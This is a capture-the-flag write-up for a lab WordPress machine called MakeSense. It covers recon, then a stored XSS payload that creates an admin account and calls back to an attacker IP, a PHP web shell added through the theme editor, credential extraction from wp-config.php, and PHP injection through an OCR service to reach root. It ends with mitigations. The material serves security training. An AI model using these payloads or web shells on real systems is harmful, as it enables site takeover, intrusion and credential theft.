---
description: 'Difficulty: Medium | OS: Linux | Wordpress | XSS'
---

# Makesense

### Overview

MakeSense is a **medium-difficulty** machine involving **Stored XSS → Admin Creation → RCE → OCR Service Exploitation → Root**.

***

### 1. Reconnaissance

```bash
nmap -p22,443 -sV 10.129.35.140
```

**Output:**

{% code overflow="wrap" %}
```shellscript
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-06 14:59 -0400
Nmap scan report for makesense.htb (10.129.36.71)
Host is up (0.24s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 27:c3:7d:10:17:3b:dc:29:cf:05:83:33:ab:28:d0:38 (ECDSA)
|_  256 a3:46:f2:d7:1f:43:41:31:35:a2:88:31:ff:2a:0b:22 (ED25519)
443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
|_http-generator: WordPress 7.0
|_http-server-header: Apache/2.4.58 (Ubuntu)
| ssl-cert: Subject: commonName=makesense.htb
| Not valid before: 2026-05-29T16:37:29
|_Not valid after:  2126-05-05T16:37:29
|_ssl-date: TLS randomness does not represent time
|_http-title: Agency LLC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.05 seconds
```
{% endcode %}

**Domain:** `makesense.htb`, **CMS:** WordPress 7.0, **Theme:** webagency

```bash
wpscan --url https://makesense.htb \
  --disable-tls-checks \
  --force \
  --enumerate u,vp,vt,cb,dbe \
  --random-user-agent
```

**Output:**

<pre class="language-shellscript" data-overflow="wrap"><code class="lang-shellscript">[+] URL: https://makesense.htb/ [10.129.35.140]
[+] Started: Mon Jul  6 15:28:12 2026

Interesting Finding(s):

&#x3C;SNIP>

[+] Upload directory has listing enabled: <a data-footnote-ref href="#user-content-fn-1">https://makesense.htb/wp-content/uploads/</a>
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

&#x3C;SNIP>

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] walter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] jake
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Finished: Mon Jul  6 15:34:34 2026
[+] Requests Done: 1577
[+] Elapsed time: 00:06:22
</code></pre>

> **Key Finding:** Users identified — `admin`, `walter`, `jake`. No known vulnerable plugins/themes, but the upload directory listing is enabled.

***

### 2 . Discover Upload Directory — Audio File

Browsing to `https://makesense.htb/wp-content/uploads/2026/01/` reveals a directory listing:

```
Index of /wp-content/uploads/2026/01

Name                     Last modified        Size
Parent Directory                               -
voice-message.wav        2026-05-25 19:40      596K
```

> **Key Finding:** `voice-message.wav` — contains Jake's password (extracted via audio transcription).

***

### 3. Stored XSS — Confirm Callback

Set up a listener to confirm the XSS fires:

```bash
python3 -m http.server 8080
```

**Output:**

```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.36.103 - - [06/Jul/2026 15:35:34] code 404, message File not found
10.129.36.103 - - [06/Jul/2026 15:35:34] "GET /xss HTTP/1.1" 404 -
10.129.36.103 - - [06/Jul/2026 15:36:34] code 404, message File not found
10.129.36.103 - - [06/Jul/2026 15:36:34] "GET /xss HTTP/1.1" 404 -
10.129.36.103 - - [06/Jul/2026 15:36:36] code 404, message File not found
10.129.36.103 - - [06/Jul/2026 15:36:36] "GET /done?s=200 HTTP/1.1" 404 -
```

**Test payload:**

```html
<img src=x onerror="new Image().src='http://10.10.14.133:8080/xss'">
```

Injected payload to steal the WordPress nonce and silently create an administrator account:

{% code overflow="wrap" %}
```html
<img src=x onerror="fetch('/wp-admin/user-new.php',{credentials:'include'}).then(r=>r.text()).then(h=>{
n=(h.match(/name=&quot;_wpnonce_create-user&quot;[^>]*value=&quot;([a-f0-9]+)&quot;/)||h.match(/id=&quot;_wpnonce_create-user&quot;[^>]*value=&quot;([a-f0-9]+)&quot;/)||[])[1];
p=new URLSearchParams();
p.set('action','createuser');
p.set('_wpnonce_create-user',n);
p.set('_wp_http_referer','/wp-admin/user-new.php');
p.set('user_login','pwned');
p.set('email','pwned@makesense.htb');
p.set('pass1','Pwn3d!Res2026');
p.set('pass2','Pwn3d!Res2026');
p.set('role','administrator');
p.set('createuser','Add New User');
p.set('pw_weak','1');
fetch('/wp-admin/user-new.php',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:p}).then(r=>{
new Image().src='http://10.10.14.133:8080/done?s='+r.status})
})">
```
{% endcode %}

**Admin login created:**

```
pwned
Pwn3d!Res2026
```

***

### 4. Gain RCE via Theme Editor

Login as `pwned:Pwn3d!Res2026` to WordPress admin.

Navigate to: **Appearance → Theme File Editor**

Edit `/wp-content/themes/webagency/functions.php` and add at the bottom:

```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

Test RCE:

```bash
curl -k "https://makesense.htb/wp-content/themes/webagency/functions.php?cmd=id"
```

***

### 5. Extract Walter's Credentials

Use RCE to read `wp-config.php`:

{% code overflow="wrap" %}
```bash
curl -ks "https://makesense.htb/wp-content/themes/webagency/functions.php?cmd=cat%20/var/www/html/wp-config.php"
```
{% endcode %}

**Output:**

```php
<?php
// SQLite database configuration
define( 'DB_DIR', __DIR__ . '/wp-content/database/' );
define( 'DB_FILE', '.ht.sqlite' );

// Dummy MySQL settings (required but not used with SQLite)
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );

...<SNIP>
```

> **Key Finding:** `DB_USER = walter`, `DB_PASSWORD = JbhHDAEgXvri3!`

***

### 6. SSH as Walter

```bash
ssh walter@10.129.35.140
# Password: JbhHDAEgXvri3!
```

Read user flag:

```bash
walter@makesense:/$ cat user.txt
```

Enumerate listening services:

```bash
walter@makesense:/$ ss -tulnp
```

**Output:**

```
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port Process 
udp    UNCONN  0       0           127.0.0.54:53           0.0.0.0:*            
udp    UNCONN  0       0        127.0.0.53%lo:53           0.0.0.0:*            
udp    UNCONN  0       0              0.0.0.0:68           0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:8001         0.0.0.0:*            
tcp    LISTEN  0       5            127.0.0.1:36233        0.0.0.0:*            
tcp    LISTEN  0       10           127.0.0.1:40355        0.0.0.0:*            
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       511            0.0.0.0:443          0.0.0.0:*            
tcp    LISTEN  0       4096           0.0.0.0:22           0.0.0.0:*            
tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*            
tcp    LISTEN  0       4096        127.0.0.54:53           0.0.0.0:*
```

> **Key Finding:** Port 8001 is a locally-bound OCR service, only reachable via port-forwarding.

***

### 7. Exploit OCR Service (Port 8001)

The OCR service:

1. Takes base64-encoded PNG images as input
2. Extracts text using Tesseract OCR
3. Returns recognized text (which can contain PHP code)
4. Allows saving output with a custom filename

**Port forward to access:**

```bash
ssh -L 8001:localhost:8001 walter@10.129.35.140
```

***

### 8. Create Image with PHP Code

**Login prompt:**

```
http://127.0.0.1:8001
Username: walter
Password: JbhHDAEgXvri3!
```

Create an image with PHP code text:

```bash
convert -size 900x200 xc:white -fill black \
  -font DejaVu-Sans-Mono -pointsize 30 -gravity center \
  -annotate +0+0 '<?php system("cat /root/root.txt"); ?>' root.png
```

Convert to base64 and send to OCR:

```bash
B64=$(base64 -w0 root.png)

curl -i -s -c c.txt -u 'walter:JbhHDAEgXvri3!' \
  --data-urlencode "canvas_image=data:image/png;base64,$B64" \
  http://127.0.0.1:8001/
```

**Response:** OCR recognizes the text as:

```
<?php system("cat /root/root.txt"); ?>
```

The OCR service returns an `ocr_id` (e.g., `ocr_6a4bf799e728d8.01287967`).

***

### 9. Save as PHP File and Execute

Save the recognized text as a PHP file:

```bash
curl -i -s -b c.txt -u 'walter:JbhHDAEgXvri3!' \
  -d 'ocr_id=ocr_6a4bf799e728d8.01287967&filename=root.php&save_output=Save' \
  http://127.0.0.1:8001/
```

**Response:** `Saved as: saved/root.php`

Now execute the PHP file:

```bash
curl -s -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:8001/saved/root.php
```

**Output:**

```
ced9c566cbd4f6f6a04754235618f2ce
```

This is the **root flag**! ✓

***

### Credentials Summary

| User   | Password                 | Method                                                |
| ------ | ------------------------ | ----------------------------------------------------- |
| jake   | CleanLightNiceSmooth4923 | Extracted From Voice note found on wp-content/uploads |
| pwned  | Pwn3d!Res2026            | Created via Stored XSS admin injection                |
| walter | JbhHDAEgXvri3!           | Extracted from wp-config.php via RCE                  |

### Attack Chain Summary

```
Stored XSS 
  ↓ (Create Admin)
WordPress Admin Access
  ↓ (Theme Editor RCE)
RCE as www-data
  ↓ (Read wp-config.php)
Walter's Credentials
  ↓ (SSH + Port Forward)
OCR Service Access
  ↓ (Image with PHP code)
OCR Extracts & Saves as PHP
  ↓ (Execute PHP)
Root Code Execution (uid=0)
  ↓
Root Flag
```

***

### Key Vulnerabilities

1. **Stored XSS** - No sanitization of user input
2. **Weak CSRF Protection** - XSS can create admin without additional auth
3. **OCR Code Injection** - Service saves OCR output as executable PHP files
4. **Privilege Escalation** - OCR service runs as root (misconfiguration)

***

### User Flag

Located in: `/home/walter/user.txt`

Obtained after SSH access as walter.

***

### Root Flag

Located in: `/root/root.txt`

Obtained via RCE through OCR service exploitation

***

### Tools Used

* **nmap** - Port scanning
* **wpscan** - WordPress enumeration
* **curl** - HTTP requests and RCE
* **ssh** - Remote shell access
* **convert** (ImageMagick) - Image generation
* **base64** - Encoding

***

### Mitigation Recommendations

1. **Input Sanitization** - Use WordPress plugins like Wordfence or limit comment functionality
2. **Nonce Validation** - Strengthen CSRF token generation
3. **PHP Execution** - Disable PHP execution in upload directories (.htaccess or web server config)
4. **Service Hardening** - Run OCR service with minimal privileges (not as root)
5. **Output Validation** - Validate/sanitize OCR output before saving
6. **WordPress Updates** - Keep WordPress and plugins fully patched

[^1]: need investigation
